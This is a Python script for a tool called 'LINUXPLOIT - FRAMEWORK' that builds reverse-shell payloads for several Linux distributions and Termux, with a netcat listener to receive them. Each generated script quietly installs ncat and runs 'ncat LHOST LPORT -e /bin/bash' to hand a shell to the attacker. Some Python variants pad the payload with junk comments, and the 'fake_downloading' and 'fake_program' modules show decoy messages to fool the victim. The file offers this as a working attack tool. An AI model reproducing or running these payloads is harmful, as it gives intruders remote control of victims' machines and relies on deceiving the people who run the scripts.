import os
import click
import socket
serveo=socket.gethostbyname("serveo.net")
print("""\033[1;35m 
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
            LINUXPLOIT - FRAMEWORK 
	       coded by: Febin Rev """)
print("\033[5;34 L-I-N-U-X-P-L-O-I-T ")
	      
print(f"""\033[1;31m (note: IF YOU ARE USING THE PAYLOAD OVER THE INTERNET , USE YOUR PUBLIC IP ADDRESS IF PORT FORWARDING ENABLED 
TO YOUR ROUTER/PUBLIC IP..........IF YOUR ROUTER/PUBLIC IP DO NOT SUPPORT PORT FORWARDING USE THIS IP IN THE LHOST >>> {serveo}
OPEN ANOTHER SESSION/TERMINAL AND RUN THE PORTFORWARDING MODULE >>>> python3 portforward.py
AND ENTER THE SAME PORT ENTERED IN THE LPORT......lport must be above 1024....

""")
print("\033[0;39m ")

lhost=click.prompt("frsf(lhost)#> ", type=str, default=socket.gethostbyname(socket.gethostname()))
print("LHOST ==> ",lhost)
print("")
lport=click.prompt("frsf(lport)#> ", type=str, default="6565")
print("LPORT ==> ",lport)
print("")
name=click.prompt("frsf(name)#> ", type=str, default="febrev")
print("PAYLOAD NAME ==> ",name)
print("")
output=click.prompt("frsf(output path)#> ", type=str, default=os.path.expanduser("~"))
print("PAYLOAD PATH ==> ",output)
print("")
print("""\033[1;34m Available payload modules>>>
 
[1] linux_debian/reverse_tcp
[2] linux_arch/reverse_tcp
[3] linux_fedora/reverse_tcp
[4] linux_redhat/reverse_tcp
[5] linux_termux/reverse_tcp
[6] python/linux_debian/reverse_tcp
[7] python/linux_arch/reverse_tcp
[8] python/linux_fedora/reverse_tcp
[9] python/linux_redhat/reverse_tcp
[10] python/linux_termux/reverse_tcp

[L] febrev-listener

Advanced payload modules>>>>

[11] linux_debian/fake_downloading/reverse_tcp
[12] linux_arch/fake_downloading/reverse_tcp
[13] linux_termux/fake_downloading/reverse_tcp
[14] linux_debian/fake_program/reverse_tcp
[15] linux_arch/fake_program/reverse_tcp
[16] linux_termux/fake_program/reverse_tcp

""")
print("\033[1;35 ")
payload=input("frsf(choose payload)#> ")
if payload=="1":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y &> /dev/null
sudo apt-get install ncat -y > /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="2":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo pacman -S install nmap -y &> /dev/null
sudo pacman -S install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="3":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo dnf install nmap-ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="4":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo yum install nmap-ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="5":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""apt-get install nmap -y &> /dev/null
apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="6":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo apt-get install nmap -y &> /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("sudo apt-get install ncat -y &> /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="7":
	print(f"GENERATING PAYLOAD {output}/{name}.sh")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo pacman -S install nmap -y &> /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("sudo pacman -S install ncat -y &> /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="8":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo dnf install nmap-ncat -y &> /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
elif payload=="9":
	print(f"GENERATING PAYLOAD {output}/{name}.sh")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("sudo yum install nmap-ncat -y &> /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()

elif payload=="10":
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	pyload=(f"""import os
#jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
#kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
#kjkasjhkjhhugkjfoldll
os.system("apt-get install nmap -y &> /dev/null")
#lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
#kjhbskjhgsajkdhjkshda
#lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
os.system("apt-get install ncat -y &> /dev/null")
#jhkjhjkhgkjhgkjhgjdkjhfjld
os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
#jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
	""")
	f=open(f"{output}/{name}.py","w+")
	f.write(pyload)
	f.close()
	
elif payload=="11":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y &> /dev/null
echo -e '\033[5;39m {additional}'
echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
sudo apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="12":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo pacman -S install nmap -y &> /dev/null
echo -e '\033[5;39m {additional}'
echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
sudo pacman -S install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="13":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y &> /dev/null
echo -e '\033[5;39m {additional}'
echo -e '\033[5;38m DOWNLOADING dependencies for {name} ..please wait!\n'
sudo apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="14":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y &> /dev/null
echo -e '\033[5;32m {additional}'
echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
sudo apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="15":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo pacman -S install nmap -y &> /dev/null
echo -e '\033[5;32m {additional}'
echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
sudo apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="16":
	additional=click.prompt("ENTER SOME ADDITONAL DIALOGUES IF YOU NEED,ELSE LEAVE BLANK:", type=str, default=" ")
	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
	with open(f"{output}/{name}.sh","w+") as f:
		s=(f"""sudo apt-get install nmap -y &> /dev/null
echo -e '\033[5;32m {additional}'
echo -e '\033[5;32m {name} is executing,this may take a while ..please wait!\n'
sudo apt-get install ncat -y &> /dev/null
ncat {lhost} {lport} -e /bin/bash &> /dev/null
		""")
		f.write(s)
		os.system(f"chmod +x {output}/{name}.sh ")
elif payload=="L":
	print("""\033[1;36m 
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
                LISTENER >>
	 """)
	print("CTRL-C to quit..")
	os.system(f"ncat -lvp {lport} ")
	print(" Connection closed...EXITING.....BYE BYE...")
	exit()
else:
	print("NO MODULE SELECTED...>ABORTING......")
	exit()

listener=click.prompt("DO YOU WANT TO START THE LISTENER ? (default y)[Y/n]:", type=str, default="y")
if listener=="y":
	print("""\033[1;36m 
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
                LISTENER >>
	 """)
	print("CTRL-C to quit..")
	os.system(f"ncat -lvp {lport} ")
	print(" Connection closed...EXITING.....BYE BYE...")
	exit()
else:
	print("EXITING...")
	exit()

















